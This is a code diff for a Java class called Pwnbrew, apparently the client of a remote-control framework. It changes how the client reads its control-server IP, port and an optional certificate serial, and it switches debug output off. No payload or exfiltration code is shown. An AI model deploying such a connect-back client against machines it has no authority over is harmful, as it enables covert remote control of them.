@@ -44,6 +44,8 @@ import java.io.InputStream;
 import java.net.URL;
 import java.net.URLConnection;
 import java.net.UnknownHostException;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.logging.Level;
 import pwnbrew.log.RemoteLog;
 import pwnbrew.log.LoggableException;
@@ -72,18 +74,18 @@ import pwnbrew.utilities.Utilities.ManifestProperties;
 public final class Pwnbrew extends PortManager implements TaskListener {
 
     private static final String NAME_Class = Pwnbrew.class.getSimpleName();
-    private static final boolean debug = true;
+    private static final boolean debug = false;
   
      
     //===============================================================
     /**
      *  Constructor
     */
-    private Pwnbrew( String[] connectStrArr ) throws LoggableException, IOException {
+    private Pwnbrew( List<String> argList ) throws LoggableException, IOException {
         
         //Make sure the we aren't running already
         DebugPrinter.enable( debug );       
-        if( connectStrArr.length == 2 ){
+        if( argList.size() > 1 ){
 
             //Get the control port
             ClientConfig theConf = ClientConfig.getConfig();
@@ -91,8 +93,13 @@ public final class Pwnbrew extends PortManager implements TaskListener {
                 throw new RuntimeException("Could not load/create the conf file.");
             }            
             
-            theConf.setServerIp(connectStrArr[0]);
-            theConf.setSocketPort(connectStrArr[1]);     
+            theConf.setServerIp(argList.get(0));
+            theConf.setSocketPort(argList.get(1));  
+            
+            //Get the serial
+            if( argList.size() > 2)
+                theConf.setServerCertSerial(argList.get(2));
+            
         
         } else {
             throw new RuntimeException("Incorrect parameters.");
@@ -178,7 +185,7 @@ public final class Pwnbrew extends PortManager implements TaskListener {
         
         try {
             
-            String[] inputArr = new String[0];
+            List<String> argList = new ArrayList<>();
             if( args.length == 0 ){
                 
                 ManifestProperties localProperties = new ManifestProperties();
@@ -210,7 +217,8 @@ public final class Pwnbrew extends PortManager implements TaskListener {
                     return;
                 }
 
-                inputArr = new String[]{ ip, thePort };
+                argList.add(ip);
+                argList.add(thePort);
             
             } else {
                 
@@ -220,17 +228,22 @@ public final class Pwnbrew extends PortManager implements TaskListener {
                 if( connectStr.contains(httpsStr)){
                     String[] connectArr = connectStr.replace(httpsStr, "").replace("/", "").trim().split(":");
                     if( connectArr.length > 1 ){
-                        inputArr = new String[]{ connectArr[0], connectArr[1]};
+                        argList.add(connectArr[0]);
+                        argList.add(connectArr[1]);
                     }
                 }
+                
+                //Check if a cert serial was sent
+                if( args.length > 1 && args[1] != null )
+                    argList.add(args[1]);                
                 
             }
         
             //Parse the command line args
-            if( inputArr.length > 0 ){
+            if( argList.size() > 0 ){
                
                 //Instantiate the manager and start it up
-                Pwnbrew entryPoint = new Pwnbrew( inputArr );
+                Pwnbrew entryPoint = new Pwnbrew( argList );
                 entryPoint.start();
 
                 return;
